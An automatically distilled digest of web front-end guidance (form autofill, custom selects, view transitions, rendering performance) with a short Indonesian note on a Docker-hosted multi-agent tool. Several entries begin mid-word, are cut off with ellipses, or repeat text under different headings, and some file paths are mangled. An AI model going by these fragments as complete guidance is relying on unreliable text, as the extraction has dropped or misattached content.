- [Source Context](NEXUS_ARCHITECTURE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build an address form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-ADDRESS-FORM.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action that shows progress and makes the next step obvious. For example, label the submit button on your delivery address form **Proceed to Payment** rather than **Continue** or **Save**.

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-ADDRESS-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Use the CSS :autofill pseudo-class to highlight form fields that have been autofilled by the browser and not edited by the user
> **Origin**: `ui-ux/NEXUS_AUTOFILL-HIGHLIGHT-INPUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use the CSS `:autofill` to highlight fields that have (or have not been) autofilled, to help guide the user to successful form completion.



To highlight a form field that has been autofilled by the browser (and not edited by the user) add a selector to your CSS using the `:autofill` class. This can be used for an `<input>`, `<select>`, or `<textarea>` element.

When styling autofilled states, you must adhere to accessibility best practices:
- **Multiple State Indicators**: Do not rely on border color alone to indicate the autofilled state. Use multiple indicators such as border thickness and custom background shading to ensure the state is perceivable.
- **Preserve Focus Indicators**: Never remove focus outlines (`outline: none`) without providing a clear, high-contrast replacement for keyboard users.

The following example uses `:autofill` to set a custom border and background, along with explicit focus styles:

```css
input:autofill,
input:-webkit-autofill {
  /* Multiple indicators: use both a distinct border and background color via box-shadow to avoid color-only state */
  border: 2px solid #2e7d32;
  box-...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-HIGHLIGHT-INPUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a payment form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-PAYMENT-FORM.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action that shows progress and makes the next step obvious. For example, label the submit button on your delivery address form **Proceed to Payment** rather than **Continue** or **Save**.

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-PAYMENT-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a sign-in form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-SIGN-IN-FORM.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use cross-platform browser features to build sign-in forms that are secure, accessible and easy to use.

If users ever need to sign in to your site, then good sign-in form design is critical. This is especially true for people on poor connections, on mobile, in a hurry, or under stress. Poorly designed sign-in forms get high bounce rates. Each bounce could mean a lost customer and a disgruntled user—not just a missed sign-in opportunity.



Outlined below are the most important guidelines for building successful sign-in forms.



Make the most of the elements and attributes built for creating forms:

- `<form>`, `<input>`, `<label>`, and `<button>`
- `type`, `autocomplete`, and `inputmode`

These enable built-in browser functionality, improve accessibility, and add meaning to markup.



To label an `<input>`, `<select>`, or `<textarea>`, use a `<label>`. Associate a label with an input by giving the label's `for` attribute the same value as the input's `id`.



Make it easy for users to enter data, by using the appropriate `<input>` element `<type>` attribute to provide the right keyboard on mobile and enab...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-SIGN-IN-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a sign-up form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-SIGN-UP-FORM.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use cross-platform browser features to build sign-up forms that are secure, accessible and easy to use.

If users ever need to sign up to your site, then good sign-up form design is critical. This is especially true for people on poor connections, on mobile, in a hurry, or under stress. Poorly designed sign-up forms get high bounce rates. Each bounce could mean a lost customer and a disgruntled user—not just a missed sign-up opportunity.



Outlined below are the most important guidelines for building successful sign-up forms.



Make the most of the elements and attributes built for creating forms:

-   `<form>`, `<input>`, `<label>`, and `<button>`
-   `type`, `autocomplete`, and `inputmode`

These enable built-in browser functionality, improve accessibility, and add meaning to markup.



To label an `<input>`, `<select>`, or `<textarea>`, use a `<label>`. Associate a label with an input by giving the label's `for` attribute the same value as the input's `id`.



Make it easy for users to enter data, by using the appropriate `<input>` element `<type>` attribute to provide the right keyboard on mobile and ...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-SIGN-UP-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Brand-Consistent Forms
> **Origin**: `ui-ux/NEXUS_BRAND-CONSISTENT-[FORMS.MD](NEXUS_FORMS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Customizing standard HTML form elements like checkboxes and radio buttons has historically been difficult. Developers often faced a choice between using the browser defaults or building custom components from scratch. Building custom controls is time-consuming and can easily lead to accessibility issues or missing states (like the indeterminate state for checkboxes).

The CSS property `accent-color` provides a simple way to bring your brand color to built-in HTML form inputs with a single line of CSS, without sacrificing accessibility or built-in browser features.



To apply your brand color to form controls:

1. **Identify your brand color:** Choose a color that represents your brand.
2. **Apply the `accent-color` property:** Add `accent-color` to the element or a container element (like `body` or a specific form) in your CSS.
3. **Support Dark Mode (Optional but Recommended):** Use `color-scheme` to let the browser know your site supports dark mode, and adjust the `accent-color` if necessary for better contrast.



```css
:root {
  --brand-color: #6200ee;
}

/* Apply accent-color to the body or a specific co...

#### 🔗 Traceability:
- [Source Context](NEXUS_BRAND-CONSISTENT-[FORMS.MD](NEXUS_FORMS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Branded Select Styling
> **Origin**: `ui-ux/NEXUS_BRANDED-SELECT-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to style `<select>` elements to perfectly match your brand's design system. By opting into `appearance: base-select`, you gain access to the internal shadow DOM of the select element, allowing you to style the button, the options picker list, the arrow icon, and the checkmark indicator using standard CSS properties.

Previously, achieving a fully branded select required rebuilding the control from scratch with JavaScript, which often broke accessibility, keyboard navigation, and native form integration. With `appearance: base-select`, you get a custom look while the browser handles focus management, top-layer rendering, and accessibility bindings.



To implement branded select styling:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element (which targets the drop-down list of options).
2. **Structure the custom button (Optional):** Define a `<button>` element directly inside the `<select>` to replace the default trigger. Use the `<selectedcontent>` element inside this button...

#### 🔗 Traceability:
- [Source Context](NEXUS_BRANDED-SELECT-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Breaking up long tasks
> **Origin**: `ui-ux/NEXUS_BREAK-UP-LONG-TASKS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Heavy computations or long loops can block the main thread, causing the page to become unresponsive. To prevent this, you should yield control back to the browser periodically. The `scheduler.yield()` API allows you to pause a long task and let the browser handle user input or rendering before continuing.



Use `scheduler.yield()` inside async functions to break up work.

```javascript
async function processLargeArray(items) {
  // DO: Set a time-based deadline 50 milliseconds into the future. 50
  // milliseconds is the boundary for when a task becomes a long task.
  let deadline = performance.now() + 50; // 50ms budget

  for (const item of items) {
    // Process the item
    processItem(item);
    
    // MANDATORY: Yield to the main thread periodically to keep the UI
    // responsive. This can be done by checking if the deadline set earlier
    // has been exceeded. When it has been, yield, then reset the deadline
    // another 50 milliseconds into the future.
    if (performance.now() >= deadline) {
      await scheduler.yield();
      deadline = performance.now() + 50;
    }
  }
}
```



Sched...

#### 🔗 Traceability:
- [Source Context](NEXUS_BREAK-UP-LONG-TASKS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Core implementation
> **Origin**: `ui-ux/NEXUS_CAROUSEL-SNAP-HIGHLIGHTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Scroll-state container queries allow you to style elements based on their current scroll state, such as whether an element is "stuck" (via sticky positioning) or "snapped" (via scroll snapping). This enables carousel or gallery experiences where the active item can be visually distinguished without relying on JavaScript intersection observers or scroll event listeners.



To highlight snapped items, you must establish a scroll-snap container, define the snap targets as scroll-state containers, and then query that state to style descendants.


The parent container must have `scroll-snap-type` enabled.

```html
<div class="carousel">
  <div class="carousel-item">
    <div class="card">Product 1 content</div>
  </div>
  <div class="carousel-item">
    <div class="card">Product 2 content</div>
  </div>
</div>
```

```css
.carousel {
  display: flex;
  overflow-x: auto;
  /* MANDATORY: Enable scroll snapping on the container */
  scroll-snap-type: x mandatory;
}
```


Each item in the carousel that should be tracked for snapping must be declared as a `scroll-state` container.

```css
.carousel-item {
  /...

#### 🔗 Traceability:
- [Source Context](NEXUS_CAROUSEL-SNAP-HIGHLIGHTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementing state-based container styling
> **Origin**: `ui-ux/NEXUS_CHILD-STATE-BASED-STYLING.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions, such as a localized theme toggle reacting to a checkbox (`:checked`), a form group highlighting an error (`:invalid`), or a card elevating when a child link is focused (`:focus-within`).

#### 🔗 Traceability:
- [Source Context](NEXUS_CHILD-STATE-BASED-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_COMPLEX-SHAPES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions from `0` to `1` (like `0.5` for 50%) instead of absolute pixels.

> **Luminance vs. Alpha Masking**: By default, SVG masks use **luminance** (brightness) to determine opacity, where white reveals, black hides, and gray creates semi-transparency. If you want the mask to use the **alpha channel** (transparency) of your SVG shapes instead, you can specify `mask-type: alpha;` in your CSS or `mask-type="alpha"` directly on the SVG `<mask>` element.

```html
<!-- White areas reveal content, gray creates semi-transparency, black or transparent hides it -->
<svg width="0" height="0">
  <defs>
    <!-- objectBoundingBox scales mask coordinates (0 to 1) with the element's size -->
    <mask id="custom-shape" maskContentUnits="objectBoundingBox">
      <!-- Use white shapes to defin

#### 🔗 Traceability:
- [Source Context](NEXUS_COMPLEX-SHAPES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Component-specific light/dark themes
> **Origin**: `ui-ux/NEXUS_COMPONENT-SPECIFIC-LIGHT-DARK-THEME.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



While more commonly set on the root, the `color-scheme` property can be set on individual elements to force them into a different color scheme from the rest of the page.
This can be useful for components that must always be viewed in a specific color scheme (e.g. always in dark or light mode).

Example use cases include:
- Elements that are often in dark mode even on light mode pages for aesthetic reasons, e.g. code blocks, media players, photo galleries
- Areas that contain media designed for a light background (e.g. images, videos, illustrations, print previews) can be set to light mode even if the rest of the page is in dark mode.
- Elements whose color-scheme is controlled by a user-level setting, such as component previews
- Embeds that don't support both light and dark modes
- Design tools, maps, visualizations, games etc.



Not every element that uses lighter text on darker background in light mode or darker text on lighter background in dark mode needs a different `color-scheme`.
For example, a primary button may be rendered as blue with white text in light mode, but that does not warrant a `color-scheme: da...

#### 🔗 Traceability:
- [Source Context](NEXUS_COMPONENT-SPECIFIC-LIGHT-DARK-THEME.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Consistent Cross-Document Transitions
> **Origin**: `ui-ux/NEXUS_CONSISTENT-[CROSS-DOCUMENT-TRANSITIONS.MD](../other/NEXUS_CROSS-DOCUMENT-TRANSITIONS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026





Cross-document view transitions animate elements between two pages during a same-origin navigation. The browser captures a snapshot of the old page, navigates, then animates from the snapshot to the new page. If the new page has not finished loading critical resources — stylesheets, layout scripts, or key DOM elements — the transition animates to an incomplete or unstyled state. This causes visual glitches such as elements morphing to wrong positions, content reflowing mid-animation, or fallback fonts flashing to web fonts after the transition completes.



Use `blocking="render"` on critical `<link>` and `<script>` elements in the new page's `<head>`, and use `<link rel="expect">` to block rendering until specific DOM elements have been parsed. This ensures the browser does not begin the view transition animation until the new page's visual state is stable. The browser continues parsing the HTML in the background — only painting is deferred.



1. **MANDATORY:** Opt in to cross-document view transitions with the `@view-transition` CSS at-rule on both pages.
2. **MANDATORY:** Ensure critical stylesheets are in the `<...

#### 🔗 Traceability:
- [Source Context](NEXUS_CONSISTENT-[CROSS-DOCUMENT-TRANSITIONS.MD](../other/NEXUS_CROSS-DOCUMENT-TRANSITIONS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementing content-based container styling
> **Origin**: `ui-ux/NEXUS_CONTENT-BASED-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Historically, applying different layouts to a component based on its content required either JavaScript or conditional logic in your HTML templating language to inject modifier classes (like `.card--has-image` or `.card--text-only`).

The `:has()` pseudo-class eliminates this need by acting as a parent selector. It allows you to conditionally style a container element based on the presence or absence of specific descendant elements.

Using `:has()`, you can easily define distinct layout variations entirely in CSS based on a component's actual DOM content. You can also optionally combine it with `:not()` to explicitly target the *absence* of content to define default layouts.



**MANDATORY**: You must use the `:has()` selector on the container element to detect the presence of specific child content.

To build a component that changes its layout based on its content:

1. **Define the default styling**: Apply the base layout styles to the container element (e.g., a simple single-column stack).
2. **Apply content-based overrides**: Target the container with `:has([child-selector])` and apply the new layout styles for when...

#### 🔗 Traceability:
- [Source Context](NEXUS_CONTENT-BASED-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Custom Select Picker Layouts
> **Origin**: `ui-ux/NEXUS_CUSTOM-SELECT-PICKER-LAYOUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



"Custom Select Picker Layouts" allow developers to break away from the traditional vertical list of options in a `<select>` dropdown. Using `appearance: base-select` and the `::picker(select)` pseudo-element, you can style the options list using modern CSS layout techniques like Grid or Flexbox. This is ideal for color pickers, emoji selectors, or product variants where a visual menu is more effective than a list.

The CSS property `appearance: base-select` unlocks the ability to style the internal parts of a `<select>` element. By targeting `select::picker(select)`, you can apply `display: grid` and position options in columns, creating a rich visual experience without custom JavaScript.



To implement a custom select picker layout:

1. **Activate Base Styling:** Apply `appearance: base-select` to both the `<select>` element and its internal picker pseudo-element `select::picker(select)`.
2. **Style the Picker Container:** Target `select::picker(select)` and apply `display: grid` (or `display: flex`). Define columns and gaps as you would for any container.
3. **Style Options:** Target the `<option>` elements to style ...

#### 🔗 Traceability:
- [Source Context](NEXUS_CUSTOM-SELECT-PICKER-LAYOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_DECLARATIVE-DIALOG-POPOVER-CONTROL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action) attributes to a `<button>`, the browser automatically handles open/close state changes, focus management, and accessibility bindings (such as `aria-expanded`). This declarative approach is recommended because it removes brittle boilerplate code, ensures interactions are functional immediately upon HTML parsing, and guarantees a robust, natively accessible user experience.

#### 🔗 Traceability:
- [Source Context](NEXUS_DECLARATIVE-DIALOG-POPOVER-CONTROL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Defer rendering heavy content
> **Origin**: `ui-ux/NEXUS_DEFER-RENDERING-HEAVY-CONTENT.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions. Modern web technologies allow you to defer the rendering workload for content that is not immediately visible, significantly boosting performance without breaking accessibility or user expectations.

To optimize rendering, you can utilize the CSS `content-visibility` property and the HTML `hidden="until-found"` attribute. While both aid performance, they serve distinct use cases.

#### 🔗 Traceability:
- [Source Context](NEXUS_DEFER-RENDERING-HEAVY-CONTENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Defer Work Until Scroll Ends
> **Origin**: `ui-ux/NEXUS_DEFER-WORK-UNTIL-SCROLL-ENDS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions if you're building carousels or testimonial galleries slides.
- **DO NOT** bundle layout-dependent dynamic updates inside dynamic visual scroll callbacks.
- **DO** consider that visual viewport zooming and scrolling triggers the `scrollend` event correctly.

#### 🔗 Traceability:
- [Source Context](NEXUS_DEFER-WORK-UNTIL-SCROLL-ENDS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation Steps
> **Origin**: `ui-ux/NEXUS_DIRECTIONAL-NAVIGATION-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Single Page Applications (SPAs) provide the appearance of navigation by replacing the content of the page without navigating to a new page. By default, the content is simply replaced, without any transitions. Directional transitions can visually reinforce a spatial relationship between views. 

By sliding new content in from the direction the user is moving you create a mental map of the application structure. For instance, a product site may show a transition to the right for "forward," and to the left for "back", or a slideshow may transition up and down to show next and previous slides.



1. **Detect Navigation Direction**: Determine if the user is moving "forward" or "backward" in the application flow. How you detect the direction depends on your use case.
2. **Trigger Transition with Types**: Pass the direction in a `types` array to `document.startViewTransition()` to categorize the transition.
3. **Define Directional Animations with CSS**: Use the `:active-view-transition-type()` pseudo-class to apply specific animations based on the navigation type.



Define sliding animations to and from each direction. For bes...

#### 🔗 Traceability:
- [Source Context](NEXUS_DIRECTIONAL-NAVIGATION-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 📜 Nexus Evolution Record: Docker & TALL Stack Strategy
> **Origin**: `ui-ux/NEXUS_DOCKER_TALL_EVOLUTION.md` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



> **Date**: 08/05/2026
> **Session Status**: Evolutionary Sync
> **Context**: Optimization of Nexus Engine for multi-project TALL Stack orchestration.

---


Nexus AI dikembangkan dengan tujuan utama yang jelas dari USER:
- **Fokus Utama**: Membangun sistem *multi-agent* yang terspesialisasi dalam pengembangan **TALL Stack** (Tailwind CSS, Alpine.js, Laravel, Livewire).
- **Skala Pengelolaan**: Mengorkestrasi dan membantu pengelolaan **3-5 proyek aktif** berbasis TALL stack secara efisien.
- **Filosofi**: Nexus bertindak sebagai **"Asisten Otonom"** yang mendukung USER, bukan menggantikannya, dengan memastikan kualitas kode dan arsitektur tetap terjaga di seluruh proyek.

---


Sistem Nexus AI kini telah dipindahkan ke dalam Docker untuk meningkatkan otonomi dan portabilitas.

- **Status Docker**: Aktif (Docker Desktop WSL2).
- **Konfigurasi**:
    - **Dockerfile**: Menggunakan `node:18-slim` dengan dependensi sistem `git` dan `curl` untuk mendukung `WorktreeManager`.
    - **Docker Compose**: Menggunakan model "Central Hub" di mana proyek eksternal di-mount ke `/app/workspace`.
- **Manfaat**: Isolasi eksekusi (Sandboxing) dan kon...

#### 🔗 Traceability:
- [Source Context](NEXUS_DOCKER_TALL_EVOLUTION.md)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Efficient Background Processing
> **Origin**: `ui-ux/NEXUS_EFFICIENT-BACKGROUND-PROCESSING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Pause heavy background tasks when a component is not being rendered by the browser to conserve system resources and battery life.



The `content-visibility: auto` property allows the browser to skip rendering calculations for elements that are far outside the viewport. When the browser decides to skip or resume rendering for an element, it fires the `contentvisibilityautostatechange` event on that element.

By listening to this event, you can pause expensive operations like `<canvas>` animations, WebGL rendering, or high-frequency WebSocket data polling when they are not needed, and resume them just-in-time when the browser prepares to display the content.



It is important to understand when to use which API:

*   **Use `IntersectionObserver` for application logic** tied to the exact visual visibility of an element in the viewport (e.g., lazy-loading data, infinite scroll triggers).
*   **Use `contentvisibilityautostatechange` for rendering-heavy work** (like complex canvas updates or heavy DOM mutations). This event ties directly to the browser's internal rendering lifecycle. The browser often starts rendering an...

#### 🔗 Traceability:
- [Source Context](NEXUS_EFFICIENT-BACKGROUND-PROCESSING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Export HTML content from canvas
> **Origin**: `ui-ux/NEXUS_EXPORT-HTML-MEDIA-FROM-CANVAS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions frame by frame, for example, for streaming, capture DOM mutations using libraries like `rrweb`. 

Alternatively, implement a warning that HTML media export is not supported in the browser because it doesn't support HTML-in-Canvas.

#### 🔗 Traceability:
- [Source Context](NEXUS_EXPORT-HTML-MEDIA-FROM-CANVAS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Faster SPA View Transitions via State Caching
> **Origin**: `ui-ux/NEXUS_FASTER-SPA-VIEW-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Enable instant navigation between views in a Single-Page Application (SPA) by caching the rendered state of inactive views instead of destroying them.



Traditionally, when a user navigates between tabs or views in an SPA, developers either destroy the old view or hide it using `display: none`. Both approaches require the browser to recreate or recalculate the full layout and paint when the user returns to that view.

By using `content-visibility: hidden` on inactive views, the browser removes the element’s contents from the layout flow and stops painting it, but *retains* its cached rendering state in memory. When the user switches back, the view restores nearly instantly.



While this approach offers massive performance benefits, it introduces a specific trade-off that you must manage carefully:

*   **CPU Savings:** Massive. The browser completely skips layout and paint passes for hidden views.
*   **RAM Cost:** High. The browser keeps all DOM nodes, event listeners, and state for the hidden view in memory.



*   **DO** use this strategy for simple applications with a small, predictable number of views (e.g...

#### 🔗 Traceability:
- [Source Context](NEXUS_FASTER-SPA-VIEW-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_FLUID-SCALING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Fluid scaling allows components to adjust their internal proportions (like font sizes and spacing) based on their current dimensions. This creates a more cohesive design than jumping between fixed breakpoints.

While fluid scaling was historically achieved using viewport units (scaling based on the screen size), modern container query units allow components to scale relative to their parent container instead. This ensures components look good regardless of where they are placed in a layout, promoting better component isolation and reusability.





To use container query units, you must first define a containment context on a parent element.

```css
.component-wrapper {
  /* Define the container type. Use 'inline-size' for width-based scaling. */
  /* You can also use 'size' for both width and height, but it requires explicit sizing. */
  container-type: inline-size;
  
  /* Optional: Name the container for specific targeting */
  container-name: fluid-card;
}
```



Use container query units (`cqi`, `cqb`, etc.) to set sizes relative to the container's dimensions.

*   `cqi`: 1% of the container's inlin...

#### 🔗 Traceability:
- [Source Context](NEXUS_FLUID-SCALING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Auto-sizing form controls
> **Origin**: `ui-ux/NEXUS_FORM-FIELDS-AUTOMATICALLY-FIT-CONTENTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

By default, form controls like `<input>`, `<textarea>`, and `<select>` have fixed dimensions. Their sizes remain constant, regardless of the amount of content the user enters or selects.

To allow these controls to automatically shrink or grow to fit their content (including placeholders), use the `field-sizing: content` CSS property.



Setting `field-sizing: content` on inputs, selects, or textareas allows them to resize dynamically as the user types or selects options. However, you must account for inherited styling, layout defaults, and minimum/maximum constraints to ensure a robust user experience.

To prevent layout issues, it is recommended to set both `min-inline-size` (or `min-width`) and `max-inline-size` (or `max-width`) alongside `field-sizing: content` on text inputs. A minimum size prevents the input from collapsing to a width of zero when empty (making it unclickable), and a maximum size ensures it doesn't expand indefinitely and break the page layout.

For textareas, allowing horizontal auto-sizing can cause a jarring UX (e.g., a textarea with a long placeholder will abruptly shrink horizontally when the us...

#### 🔗 Traceability:
- [Source Context](NEXUS_FORM-FIELDS-AUTOMATICALLY-FIT-CONTENTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation steps
> **Origin**: `ui-ux/NEXUS_GROUP-ELEMENT-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

As items are added or removed from a list, or rearranged, transitions can help users maintain context. View transitions provide a way to transition between two states of an element by giving the element a unique `view-transition-name`. When multiple elements on a page share the same transition behavior, `view-transition-class` allows you to define that logic once in CSS rather than repeating it for every unique `view-transition-name`. This keeps your stylesheets maintainable while ensuring consistent animations across a group of elements.



1. **Assign unique names and a shared class**

Each element that needs to be tracked individually during a transition must have a unique `view-transition-name`.

```html
<!-- Mandatory: Each element must have a unique view-transition-name -->
<li style="view-transition-name: item-1" class="item">Item 1</li>
<li style="view-transition-name: item-2" class="item">Item 2</li>
```

To apply shared styles, also assign a `view-transition-class`.

```css
.item {
  view-transition-class: list-item;
}
```

2. **Define the shared transition logic**
   
Use the `::view-transition-gro...

#### 🔗 Traceability:
- [Source Context](NEXUS_GROUP-ELEMENT-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Identify heavy-running JavaScript
> **Origin**: `ui-ux/NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions.

The Long Animation Frames API is a lightweight API that can be used to identify heavy-running JavaScript in the field. A heavy-running script can be either a single long-running script, or a script that runs multiple times during the page lifecycle.

#### 🔗 Traceability:
- [Source Context](NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Identify causes of poor INP
> **Origin**: `ui-ux/NEXUS_IDENTIFY-INP-CAUSES.MD` | **Distilled At**: 26/05/2026

#### 🧐 Core Insights (Distilled):
insights for JavaScript code delaying an interaction. A full performance trace using the JS Self-Profiling API is a heavyweight solution that is liable to cause performance problems. The Long Animation Frames API is a lightweight API that can be used to identify slow running JavaScript in the field for INP interactions.

#### 🛠 Actionable Steps:
actions leads to a poor impression of a page being slow or even completely broken. Interaction to Next Paint (INP) is a metric based on the Event Timing API. It measures the worst interaction (minus some outliers) as a measure of the page's responsiveness.

Identifying root causes of an unresponsive web page can be tricky especially as it depends on user interactions and environmental conditions such as device capabilities and network conditions. This makes it even more difficult to diagnose compared to a more repeatable and predictable scenario like page load. Lab data only replicates a small subset of real user scenarios so measuring the causes of slow INP in the field is essential.

The Event Timing API allows for splitting the INP duration into three subparts: Input Delay (processi

#### 🔗 Traceability:
- [Source Context](NEXUS_IDENTIFY-INP-CAUSES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Improve next page load performance
> **Origin**: `ui-ux/NEXUS_IMPROVE-NEXT-PAGE-LOAD-[PERFORMANCE.MD](../ui-ux/NEXUS_PERFORMANCE.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



One of the most effective ways to improve page load performance for users navigating a site is to initiate loading the next page they're about to visit *before* they visit it. This can be done through a technique called speculative loading using the Speculation Rules API.



Speculative loading works by using JSON-based speculation rules to tell the browser about links that can be prefetched or prerendered improving page load performance when user clicks on them.

The rules can either be a hardcoded list of URLs a `urls` key (known as a list rule), or with a `where` key containing a set of href and CSS selectors used to find links on the page (known as a `document` rule).

Rules can also include an optional `eagerness` property that specifies when the page should be prefetched or prerendered. The `eagerness` property can be set to `immediate`, `eager`, `moderate`, or `conservative`. `immediate` speculates as soon as possible, while the others wait for user signals such as hovering for a short period, for a longer period, or starting to click on the page respectively.

Rules can be combined with different eagerness setti...

#### 🔗 Traceability:
- [Source Context](NEXUS_IMPROVE-NEXT-PAGE-LOAD-[PERFORMANCE.MD](../ui-ux/NEXUS_PERFORMANCE.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Improve Text Layout and Legibility
> **Origin**: `ui-ux/NEXUS_IMPROVE-TEXT-LAYOUT-AND-LEGIBILITY.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action with Width:** `text-wrap: balance` does not change the container's width (`inline-size`). It only affects how text wraps *within* that width. This can leave empty space at the end of the container, which may affect layouts relying on full-width text blocks.

#### 🔗 Traceability:
- [Source Context](NEXUS_IMPROVE-TEXT-LAYOUT-AND-LEGIBILITY.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Key Implementation Details
> **Origin**: `ui-ux/NEXUS_INDIVIDUAL-TRANSFORM-PROPERTIES.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

The `transform` property allows you to apply multiple transformations in a specified order, but any changes to a single transformation require re-specifying the entire transformation chain. This makes it tricky to animate or transition a single transformation.

The individual CSS transform properties (`translate`, `rotate`, and `scale`) allow you to apply transformations independently of the `transform` property. This approach makes it simpler to override a single transformation, for instance on `:hover`.



Individual transform properties are always applied in a **fixed order**, regardless of their order in your CSS:
1. `translate`
2. `rotate`
3. `scale`
4. `transform` (applied last)

If you require a different order (e.g., scaling *before* rotating), you must continue using the `transform` property functions.

